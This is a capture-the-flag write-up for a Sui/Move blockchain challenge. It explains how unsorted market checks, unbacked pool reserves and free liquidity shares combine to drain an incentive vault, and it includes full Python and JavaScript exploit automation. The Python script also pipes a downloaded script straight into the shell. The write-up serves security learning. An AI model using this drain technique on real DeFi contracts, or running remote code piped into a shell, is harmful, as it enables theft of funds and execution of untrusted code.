# Compfest Coin — Writeup

* **Category:** Blockchain (Sui / Move)
* **Points:** 100
* **Solves:** 49
* **Challenge ID:** 16
* **Target Endpoint:** authorized challenge instance

---

## 1. Challenge Overview

The challenge presents a decentralized liquidity routing and incentive protocol written in the **Move** programming language for the **Sui** blockchain. 

We are provided with the Move source files:
- `assets.move`: Defines phantom coin types `SUIX`, `USDC`, and `CFX`.
- `config.move`: Defines `GlobalConfig` managing fees, minimum liquidity limits, and targets.
- `oracle.move`: Defines `PriceOracle` returning price feeds.
- `pool.move`: Implements constant-product-like AMM routing pools (`RoutePool`) and user positions (`RoutePosition`).
- `registry.move`: Manages markets (`direct_market`, `canonical_market`) and registered route strategies (`RouteStrategy`).
- `setup.move`: Deployment and victory verification script (`solve`).
- `vault.move`: `IncentiveVault` containing 1,000 `CFX` incentives distributed to qualified operators.

The win condition defined in `setup.move`:
```move
public entry fun solve(setup: &mut Setup, account: &vault::OperatorAccount<CFX>, config: &config::GlobalConfig) {
    assert!(vault::is_qualified(account, config), ENotQualified);
    setup.solved = true;
}
```
Where `vault::is_qualified` checks:
```move
public fun is_qualified(account: &OperatorAccount<CFX>, config: &GlobalConfig): bool {
    account.earned >= config::bounty_target(config)
}
```
From `config.move`, `bounty_target` is `500` CFX. The player's `OperatorAccount<CFX>` starts with `earned = 0`.

---

## 2. Vulnerability Analysis

### Flaw 1: Unordered Canonical Market vs. Direct Market Asymmetry
In `vault.move`, the incentive vault is initialized with the canonical market between `SUIX` and `USDC`:
```move
let canonical = registry::canonical_market<challenge::assets::SUIX, challenge::assets::USDC>();
```
In `registry.move`, the canonical market is lexicographically ordered:
```move
public fun canonical_market<A, B>(): vector<u8> {
    let left = type_bytes<A>();
    let right = type_bytes<B>();
    if (math::bytes_lt(&right, &left)) {
        math::join_key(right, left)
    } else {
        math::join_key(left, right)
    }
}
```
Therefore:
$$\text{canonical\_market}\langle\text{USDC}, \text{SUIX}\rangle \equiv \text{canonical\_market}\langle\text{SUIX}, \text{USDC}\rangle$$

However, when creating a pool in `pool::create_route_pool`, the registry checks the **direct market** (which is NOT sorted):
```move
let direct = registry::direct_market<Base, Quote>();
assert!(!registry::has_market(registry, &direct), EMarketAlreadyRegistered);
```
During initialization, only `direct_market<SUIX, USDC>` was registered. The reverse pair `direct_market<USDC, SUIX>` is unlisted! Anyone can call `create_route_pool<USDC, SUIX>` to create a new shared pool that shares the exact same `canonical_market` as the incentive vault.

### Flaw 2: Arbitrary Reserve Setting & Oracle Price Manipulation
When creating a pool via `create_route_pool<Base, Quote>`, the caller can specify arbitrary reserves up to `rebalance_cap` ($2{,}000{,}000$):
```move
assert!(reserve_base <= cap && reserve_quote <= cap, EPoolNotRebalanceable);
```
Crucially, the pool does NOT require depositing any real coins or tokens to back these reserves!

In `pool::quoted_route_score`:
```move
public fun quoted_route_score<Base, Quote>(
    pool: &RoutePool<Base, Quote>,
    oracle: &PriceOracle,
): u64 {
    let raw = pool.reserve_quote / pool.reserve_base;
    let oracle_price = oracle::price_e6(oracle);
    if (raw > oracle_price) { raw } else { oracle_price }
}
```
If we set:
- `reserve_base` $= 1$
- `reserve_quote` $= 2{,}000{,}000$

Then:
$$\text{raw} = \frac{2{,}000{,}000}{1} = 2{,}000{,}000$$
The route score is inflated to $2{,}000{,}000$, exceeding the vault's entire balance ($1{,}000$ CFX).

### Flaw 3: Free Liquidity Addition Without Coins
In `pool::add_liquidity`:
```move
public entry fun add_liquidity<Base, Quote>(
    pool: &mut RoutePool<Base, Quote>,
    position: &mut RoutePosition<Base, Quote>,
    shares: u64,
    config: &GlobalConfig,
) {
    assert!(shares > 0, EInvalidAmount);
    assert!(position.pool == object::id(pool), EWrongPosition);
    let net_shares = math::apply_fee_floor(shares, config::liquidity_fee_bps(config));
    pool.lp_supply = pool.lp_supply + net_shares;
    pool.accounted_liquidity = pool.accounted_liquidity + net_shares;
    position.shares = position.shares + net_shares;
}
```
Notice that `add_liquidity` accepts an integer `shares` without transferring any tokens or coins! Anyone can mint arbitrary position shares for free.

### Flaw 4: Strategy Registration Using Primitive Types
`claim_route_incentives` requires a `RouteStrategy<Strategy>` matching `vault.market`:
```move
assert!(math::same_bytes(&vault.market, registry::market(strategy)), EStrategyNotRegistered);
```
In `registry::register_route_strategy<Base, Quote, Strategy: drop>`:
Any type with the `drop` ability can be used. In Move, primitive types like `u64` have `drop`, meaning we can register a strategy with `Strategy = u64` and witness `0: u64` without publishing any custom package or modules!

---

## 3. Exploit Strategy

1. **Solve PoW & Deploy Instance:**
   - Solve the redpwn proof-of-work and request a challenge container from the authorized challenge instance.

2. **Step 1 — Deploy Skewed Pool:**
   - Call `pool::create_route_pool<USDC, SUIX>` with `reserve_base = 1` and `reserve_quote = 2_000_000`.
   - The newly created pool has canonical market matching the incentive vault, but with an artificially inflated route score of $2{,}000{,}000$.

3. **Step 2 — Open Position & Register Strategy:**
   - Call `pool::open_position<USDC, SUIX>` on the new pool.
   - Call `registry::register_route_strategy<USDC, SUIX, u64>(registry, 0)`.

4. **Step 3 — Free Liquidity & Full Vault Drain:**
   - Call `pool::add_liquidity<USDC, SUIX>(pool, position, 1000, config)`.
     - `effective_liquidity = 1000 >= min_effective_liquidity (500)`.
   - Call `vault::claim_route_incentives<USDC, SUIX, u64>(vault, pool, strategy, position, account, oracle, config)`.
     - Claim amount is $\min(2{,}000{,}000, 1{,}000) = 1{,}000$ CFX.
     - `account.earned` becomes $1{,}000$.
   - Call `setup::solve(setup, account, config)`.
     - `account.earned (1000) >= bounty_target (500)` $\implies$ `setup.solved = true`.

5. **Retrieve Flag:**
   - Send `GET /flag` with the active session cookies to receive the flag.

---

## 4. Automation Code

### `full_solve.py`
```python
import requests, subprocess, json, sys, os

base_url = os.environ["CHALLENGE_URL"].rstrip("/")
s = requests.Session()

# 1. PoW Challenge
r = s.get(f"{base_url}/challenge")
ch = r.json()["challenge"]

# 2. Solve PoW
sol = subprocess.check_output(f"curl -sSfL https://pwn.red/pow | sh -s {ch}", shell=True, text=True).strip()

# 3. Submit Solution & Launch
s.post(f"{base_url}/solution", json={"solution": sol})
r_launch = s.post(f"{base_url}/launch")
data = r_launch.json()

launch_info = {
    "rpc_url": data["0"]["RPC_URL"].replace("{ORIGIN}", base_url),
    "privkey": data["1"]["PRIVKEY"],
    "wallet_addr": data["2"]["WALLET_ADDR"],
    "package_id": data["3"]["PACKAGE_ID"],
    "setup_id": data["4"]["SETUP_ID"],
    "registry": data["5"]["REGISTRY"],
    "vault": data["6"]["VAULT"],
    "pool": data["7"]["POOL"],
    "account": data["8"]["ACCOUNT"],
    "config": data["9"]["CONFIG"],
    "oracle": data["10"]["ORACLE"],
}

with open("/tmp/sui_launch_info.json", "w") as f:
    json.dump(launch_info, f, indent=2)

# 4. Run Sui Move exploit via @mysten/sui TypeScript SDK
subprocess.run("node solve_sui_runner.mjs", shell=True, check=True)

# 5. Fetch Flag
r_flag = s.get(f"{base_url}/flag")
print(r_flag.json()["flag"])
```

### `solve_sui_runner.mjs`
```javascript
import { SuiJsonRpcClient } from '@mysten/sui/jsonRpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
import { Transaction } from '@mysten/sui/transactions';
import fs from 'fs';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const info = JSON.parse(fs.readFileSync('/tmp/sui_launch_info.json', 'utf8'));

const client = new SuiJsonRpcClient({ url: info.rpc_url });
const decoded = decodeSuiPrivateKey(info.privkey);
const keypair = Ed25519Keypair.fromSecretKey(decoded.secretKey);
const address = keypair.toSuiAddress();

const PACKAGE_ID = info.package_id;
const SETUP_ID = info.setup_id;
const REGISTRY = info.registry;
const VAULT = info.vault;
const ACCOUNT = info.account;
const CONFIG = info.config;
const ORACLE = info.oracle;

const USDC = `${PACKAGE_ID}::assets::USDC`;
const SUIX = `${PACKAGE_ID}::assets::SUIX`;

async function main() {
  // Step 1: Create skewed pool
  const tx1 = new Transaction();
  tx1.setSender(address);
  tx1.setGasBudget(100_000_000);
  tx1.moveCall({
    target: `${PACKAGE_ID}::pool::create_route_pool`,
    typeArguments: [USDC, SUIX],
    arguments: [tx1.object(REGISTRY), tx1.object(CONFIG), tx1.pure.u64(1), tx1.pure.u64(2_000_000)],
  });
  const res1 = await client.signAndExecuteTransaction({ signer: keypair, transaction: tx1, options: { showEvents: true } });
  const poolId = res1.events.find(e => e.type.includes('RoutePoolCreated')).parsedJson.pool;
  await sleep(3000);

  // Step 2: Open position and register strategy
  const tx2 = new Transaction();
  tx2.setSender(address);
  tx2.setGasBudget(100_000_000);
  tx2.moveCall({ target: `${PACKAGE_ID}::pool::open_position`, typeArguments: [USDC, SUIX], arguments: [tx2.object(poolId)] });
  tx2.moveCall({ target: `${PACKAGE_ID}::registry::register_route_strategy`, typeArguments: [USDC, SUIX, 'u64'], arguments: [tx2.object(REGISTRY), tx2.pure.u64(0)] });
  const res2 = await client.signAndExecuteTransaction({ signer: keypair, transaction: tx2, options: { showEffects: true } });
  
  let positionId, strategyId;
  for (const c of res2.effects.created) {
    const obj = await client.getObject({ id: c.reference.objectId, options: { showType: true } });
    if (obj.data?.type?.includes('RoutePosition')) positionId = c.reference.objectId;
    if (obj.data?.type?.includes('RouteStrategy')) strategyId = c.reference.objectId;
  }
  await sleep(3000);

  // Step 3: Add free liquidity, drain incentives, solve
  const tx3 = new Transaction();
  tx3.setSender(address);
  tx3.setGasBudget(100_000_000);
  tx3.moveCall({ target: `${PACKAGE_ID}::pool::add_liquidity`, typeArguments: [USDC, SUIX], arguments: [tx3.object(poolId), tx3.object(positionId), tx3.pure.u64(1000), tx3.object(CONFIG)] });
  tx3.moveCall({ target: `${PACKAGE_ID}::vault::claim_route_incentives`, typeArguments: [USDC, SUIX, 'u64'], arguments: [tx3.object(VAULT), tx3.object(poolId), tx3.object(strategyId), tx3.object(positionId), tx3.object(ACCOUNT), tx3.object(ORACLE), tx3.object(CONFIG)] });
  tx3.moveCall({ target: `${PACKAGE_ID}::setup::solve`, typeArguments: [], arguments: [tx3.object(SETUP_ID), tx3.object(ACCOUNT), tx3.object(CONFIG)] });
  await client.signAndExecuteTransaction({ signer: keypair, transaction: tx3 });
  console.log('[+] Exploit completed successfully.');
}

main();
```

---

## 5. Flag

```text
COMPFEST18{Allow_me_to_say_goodbye_to_the_Crypto_World_Today_might_be_the_heaviest_day_for_me_My_hands_are_trembling_as_I_write_this_my_chest_feels_tight_and_my_head_is_full_of_thoughts_The_crypto_world_really_knows_no_mercy_I_have_fought_this_far_hoping_there_would_be_light_at_the_end_of_that_red_chart_But_the_reality_is_Crypto_is_sadistic_and_cruel_Sometimes_it_drains_not_only_your_balance_but_also_your_heart_and_spirit_For_friends_who_have_not_entered_yet_listen_carefully_Do_not_be_reckless_This_world_is_not_a_place_to_just_try_things_Learn_first_understand_the_risks_and_never_put_in_more_than_you_can_afford_to_lose_I_apologize_if_any_of_my_words_have_offended_anyone_here_There_was_never_any_bad_intention_only_the_emotions_of_someone_who_has_endured_the_storm_for_too_long_And_now_I_give_up_I_want_to_rest_Those_of_you_who_are_still_strong_continue_your_struggle_But_for_those_who_also_feel_broken_maybe_it_is_time_for_us_to_CL_together_Alt_season_is_really_over_Thank_you_for_all_the_stories_laughter_and_pain_we_have_shared_here_See_you_in_the_next_life_not_as_a_trader_but_as_a_human_who_has_learned}
```
